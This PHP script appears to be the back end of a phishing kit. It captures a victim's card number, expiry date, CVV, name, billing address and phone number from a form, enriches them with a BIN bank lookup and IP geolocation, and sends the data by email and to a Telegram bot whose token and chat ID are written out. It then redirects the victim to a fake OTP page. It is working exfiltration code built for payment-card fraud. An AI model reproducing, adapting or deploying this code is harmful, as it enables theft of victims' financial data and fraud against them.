<?php
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$_SERVER['REMOTE_ADDR']."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$bbbilling = $_SESSION['bbbilling'] = $_POST['bbbilling'];
$pppostcode = $_SESSION['pppostcode'] = $_POST['pppostcode'];
$hppnumber = $_SESSION['hppnumber'] = $_POST['hppnumber'];
$nmoncrd = $_SESSION['nmoncrd'] = $_POST['nmoncrd'];
$cccrd = $_SESSION['cccrd'] = $_POST['cccrd'];
$eeexm = $_SESSION['eeexm'] = $_POST['eeexm'];
$ccsc = $_SESSION['ccsc'] = $_POST['ccsc'];
$bin = $_POST['cccrd'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,6);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$subject  = "".strtoupper($xBIN["scheme"])." ".$bin." ".$COUNTRYNAME." ".$_SERVER['REMOTE_ADDR']."";
$lgmailsd = 'zeb';
$XMSG ="
-------------------------------------------------------------
-----------
CARD:   ".strtoupper($xBIN["scheme"])."
BANK:       ".$xBIN["bank"]["name"]."
CARD LEVEL:    ".strtoupper($xBIN["brand"])." 
CARD TYPE:     ".strtoupper($xBIN["type"])."
-----------
NAME ON CARD:  ".$nmoncrd."
CARD NUMBER:    ".$cccrd."
EXPERATION:   ".$eeexm."
CVV:   ".$ccsc."
-----------
ADDRESS:    ".$bbbilling."
ZIP CODE:   ".$pppostcode."
PHONE NMBR:   ".$hppnumber."
-----------
IP:  ".$_SERVER['REMOTE_ADDR']."
IP COUNTRY CODE:   ".$COUNTRYCODE."
IP COUNTRY NAME:   ".$COUNTRYNAME."
-----------
-------------------------------------------------------------
";
mail($lgmailsd, $subject, $XMSG, $headers);
header("location: ./otpcv/index.php?");
  $website="https://api.telegram.org/bot7569076673:AAG0um_X_8xf6kvZ5OPADdfBLa6rvS_jG6k";$params=['chat_id'=>-4683894805,'text'=>$XMSG,];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
?>